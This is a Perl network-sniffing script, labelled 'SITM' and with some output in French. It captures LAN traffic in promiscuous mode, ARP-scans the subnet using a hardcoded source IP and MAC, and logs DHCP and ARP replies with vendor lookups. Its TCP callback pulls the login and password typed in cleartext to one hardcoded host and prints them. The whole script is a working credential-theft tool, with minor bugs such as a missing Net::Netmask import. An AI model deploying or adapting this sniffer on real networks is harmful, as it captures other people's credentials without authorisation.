#!/usr/bin/perl -w
#use strict;
#use warnings;
use Net::RawIP;
use Net::ARP;
use Net::Pcap::Easy;
use Net::MAC;
use Net::MAC::Vendor;
use Net::DHCP::Packet;
use Getopt::Long;
use Socket;

my $SHOW_MAC = 0;
my $listen_mode;
my $l;
my %hash = (
Login=>'',
Password=>'');
my $tmp=0;
	
GetOptions ("listen" => \$listen_mode);

sub StartCap()
{
    my $npe = Net::Pcap::Easy->new(
        dev              => "eth0",
        timeout_in_ms    => 0, # 0ms means forever
        promiscuous      => 1, # true or false

        tcp_callback => sub {
            my ($npe, $ether, $ip, $tcp, $header ) = @_;
            if ($ip->{src_ip} ne "10.8.99.230" and $ip->{dest_ip} ne "10.8.99.230"){
                print "[SITM] TCP : $ip->{src_ip}:$tcp->{src_port}"
                 . " -> $ip->{dest_ip}:$tcp->{dest_port}\n";
                print "[TCP INFO] : $ether->{src_mac} -> $ether->{dest_mac}\n" if $SHOW_MAC;
            }

            if ($ip->{dest_ip} eq "10.8.111.245" ){
				if ($tcp->{data} =~ /[A-Za-z0-9]/){            					  
					$l.=$tcp->{data};
					}
							
					
						
				if ($tcp->{data} =~ /\r/)
				{					
					if ($tmp == 0){
						$hash{'Login'} = $l;						
						$l = "";
						$tmp=1;
					}
					elsif($tmp == 1){
						$hash{'Password'} = $l;
						$tmp=2;
						foreach my $i (keys (%hash)){
							print "$i => $hash{$i}\n";
							}
						}								
					}			
				}
    	   	 },


        icmp_callback => sub {
            my ($npe, $ether, $ip, $icmp, $header ) = @_;
            print "[SITM] ICMP: $ether->{src_mac}:$ip->{src_ip}"
             . " -> $ether->{dest_mac}:$ip->{dest_ip}\n";
        },

        udp_callback => sub {
            my ($npe, $ether, $ip, $udp, $header ) = @_;
            if ($udp->{dest_port} == 67)
            {
                print "[SITM] Got DHCP Request !\n";
                my $packet = Net::DHCP::Packet->new($udp->{data});
                print STDERR $packet->toString();
            }
        },

        arp_callback => sub {
            my ($npe, $ether, $arp, $header) = @_;
            if ($arp->{opcode} == 2)
            {
        		my $ipsrc = IPFormat($arp->{spa});
        		my $macsrc = MacFormat($arp->{sha});
        		my $hostname = ResolveHostName($ipsrc);
                print("[SITM] ARP Reply : hw addr=$macsrc [ ".LookupMacVendor($macsrc)." ], " .
                "resolved IP Address : $ipsrc [ ".$hostname." ]\n");
            }
            
        }
    );
    print "Network IP : " .$npe->network ."\n";
    print "Netmask : " .$npe->netmask ."\n";
    my $block = GetLocalNetInfo($npe->network, $npe->netmask);

    print "la taille du réseau est:".$block->size()."\n";
    print "premiere adresse :".$block->first()."\n";
    print "derniere adresse :".$block->last()."\n";
    if (!$listen_mode)
    {
        MapNetwork($block->first(),$block->last());
    }
    1 while $npe->loop;
}

sub IPFormat
{
    return join ".", map { hex }($_[0] =~ /([[:xdigit:]]{2})/g)
}

sub MacFormat
{
    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
}


sub ResolveHostName {
    my $hostname = gethostbyaddr(inet_aton($_[0]), AF_INET);
    if ($hostname)
    {
	return $hostname;
    }
    else
    {
	return "Unknown";
    }
}

sub LookupMacVendor {
    my $cmac = Net::MAC->new('mac' => $_[0])->convert(
            'base' => 16,
            'bit_group' => 8,
            'delimiter' => ':'
    ); 
    my $vendor = Net::MAC::Vendor::lookup( $cmac );;
    if (@$vendor[0])
    {
        return @$vendor[0];
    }
    else
    {
        return "Unknown"
    }
}

sub GetLocalNetInfo {
    my $block = new Net::Netmask($_[0],$_[1]);
    return $block;
}

sub MapNetwork {
    my $currentip; 
    my ($a,$b,$c,$d) = split(/\./, $_[0]);

    do
    {
        $d++;
        $currentip = "$a.$b.$c.$d";
        print "Probing : $a.$b.$c.$d\n";
        Net::ARP::send_packet('wlan0',                 # Device
                '10.8.99.230',          # Source IP
                $currentip,          # Destination IP
                '94:db:c9:47:dc:6d',  # Source MAC
                'FF:FF:FF:FF:FF:FF',  # Destinaton MAC
                'request');             # ARP operation
        if ($d == 255)
        {
            $c++;
            $d = 0;
        }
        if ($c == 255)
        {
            $b++;
            $c =0;
        }
        if ($b == 255)
        {
            $a++;
            $b = 0;
        }

    } while ($currentip ne $_[1]);

}


StartCap();
